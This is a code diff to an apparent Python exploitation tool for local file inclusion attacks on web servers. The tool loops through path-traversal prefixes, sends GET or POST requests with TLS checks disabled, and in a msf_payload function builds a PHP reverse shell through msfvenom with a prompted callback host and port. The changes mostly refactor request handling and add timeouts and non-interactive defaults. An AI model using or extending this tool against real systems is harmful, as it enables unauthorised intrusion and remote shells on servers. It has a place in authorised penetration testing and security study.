@@ -27,6 +27,21 @@ USER_AGENTS = [
 
 # Rate limiting configuration
 RATE_LIMIT_DELAY = 0.1  # Default delay between requests in seconds
+REQUEST_TIMEOUT = (5, 15)  # connect timeout, read timeout
+
+
+def is_interactive():
+    return sys.stdin.isatty()
+
+
+def prompt_input(message, default=""):
+    if is_interactive():
+        return input(message)
+    return default
+
+
+def resolve_location(location, default):
+    return location or default
 
 
 class listener:
@@ -44,8 +59,8 @@ class listener:
 def msf_payload():
     """Use msfvenom to generate reverse shell payload"""
     filepath = "/tmp/shell.php"
-    lhost = input(colors("[?] Host For Callbacks: ", 94))
-    lport = input(colors("[?] Port For Callbacks: ", 94))
+    lhost = prompt_input(colors("[?] Host For Callbacks: ", 94), "127.0.0.1")
+    lport = prompt_input(colors("[?] Port For Callbacks: ", 94), "4444")
 
     print(colors("[~] Generating PHP listener", 93))
 
@@ -78,7 +93,12 @@ def colors(string, color):
 
 
 def cook(cookies):
-    c = dict(item.split("=") for item in cookies.split(";"))
+    c = {}
+    for item in cookies.split(";"):
+        if "=" not in item:
+            continue
+        key, value = item.split("=", 1)
+        c[key.strip()] = value.strip()
     return c
 
 
@@ -154,9 +174,10 @@ def attack(
     """
 
     url = target + location
+    method = method.upper()
 
-    # Merge custom headers with default headers
-    request_headers = headers or {}
+    # Merge custom headers with default headers without mutating caller-owned dicts.
+    request_headers = dict(headers or {})
     if custom_headers:
         request_headers.update(custom_headers)
 
@@ -169,116 +190,71 @@ def attack(
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
             )
 
-    # Apply rate limiting before making requests
-    if rate_limit:
-        apply_rate_limit()
+    def send_request(request_url, request_location=location):
+        if rate_limit:
+            apply_rate_limit()
+
+        if method == "POST":
+            if data is not None:
+                body = data
+                request_url = target
+            elif post_data:
+                body = post_data
+            else:
+                body = {"file": request_location}
+                request_url = request_url.split("?")[0]
+
+            return requests.post(
+                request_url,
+                headers=request_headers,
+                cookies=cookies,
+                data=body,
+                verify=False,
+                timeout=REQUEST_TIMEOUT,
+            )
+
+        return requests.get(
+            request_url,
+            headers=request_headers,
+            cookies=cookies,
+            verify=False,
+            timeout=REQUEST_TIMEOUT,
+        )
 
     try:
-        if dt:
-            if method.upper() == "POST":
-                res = requests.post(
-                    url, headers=request_headers, data=post_data, verify=False
-                )
-            else:
-                res = requests.get(url, headers=request_headers, verify=False)
-            if res.status_code == 200:
-                print(colors("[+] Vulnerable: " + url, 92))
+        if relative:
+            response = None
+            for traversal in PATH_TRAVERSAL:
+                for i in range(10):
+                    relative_location = traversal * i + location
+                    response = send_request(target + relative_location, relative_location)
+                    if response.status_code != 200:
+                        from .rich_output import print_error
 
-        # Main request
-        if method.upper() == "POST":
-            if post_data:
-                response = requests.post(
-                    url,
-                    headers=request_headers,
-                    cookies=cookies,
-                    data=post_data,
-                    verify=False,
-                )
-            else:
-                # For POST requests without explicit data, put the location in POST body
-                post_body = {"file": location} if not post_data else post_data
-                response = requests.post(
-                    url.split("?")[0],
-                    headers=request_headers,
-                    cookies=cookies,
-                    data=post_body,
-                    verify=False,
-                )
-        else:
-            response = requests.get(
-                url, headers=request_headers, cookies=cookies, verify=False
-            )
+                        print_error("Unexpected HTTP Response")
+
+            if not detection_mode:
+                from .rich_output import print_error
+
+                print_error("Try Refreshing Your Browser If You Haven't Gotten A Shell")
+            return response
+
+        response = send_request(url)
 
         if response.status_code != 200:
             from .rich_output import print_error
 
             print_error("Unexpected HTTP Response")
-            sys.exit(1)
-        if not relative:
-            if method.upper() == "POST":
-                if post_data:
-                    r = requests.post(
-                        url, headers=request_headers, data=post_data, verify=False
-                    )
-                else:
-                    post_body = {"file": location}
-                    r = requests.post(
-                        url.split("?")[0],
-                        headers=request_headers,
-                        data=post_body,
-                        verify=False,
-                    )
-            else:
-                r = requests.get(url, headers=request_headers, verify=False)
+            if is_interactive():
+                sys.exit(1)
+            return response
 
-            if r.status_code != 200:
-                if not detection_mode:
-                    from .rich_output import print_error
+        if dt:
+            print(colors("[+] Vulnerable: " + url, 92))
+        elif not detection_mode:
+            from .rich_output import print_error
 
-                    print_error("Unexpected HTTP Response")
-            else:
-                if not detection_mode:
-                    from .rich_output import print_error
-
-                    print_error(
-                        "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell"
-                    )
-
-        else:
-            for traversal in PATH_TRAVERSAL:
-                for i in range(10):
-                    lfi = target + traversal * i + location
-                    if method.upper() == "POST":
-                        if post_data:
-                            r = requests.post(
-                                lfi,
-                                headers=request_headers,
-                                cookies=cookies,
-                                data=post_data,
-                                verify=False,
-                            )
-                        else:
-                            post_body = {"file": traversal * i + location}
-                            r = requests.post(
-                                target,
-                                headers=request_headers,
-                                cookies=cookies,
-                                data=post_body,
-                                verify=False,
-                            )
-                    else:
-                        r = requests.get(
-                            lfi, headers=request_headers, cookies=cookies, verify=False
-                        )
-
-                    if r.status_code != 200:
-                        from .rich_output import print_error
-
-                        print_error("Unexpected HTTP Response")
-            if not detection_mode:
-                from .rich_output import print_error
-
-                print_error("Try Refreshing Your Browser If You Haven't Gotten A Shell")
+            print_error("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell")
 
         return response
 
@@ -287,4 +263,6 @@ def attack(
 
         print_error("HTTP Error")
         print_error(str(e))
-        sys.exit(1)
+        if is_interactive():
+            sys.exit(1)
+        return None
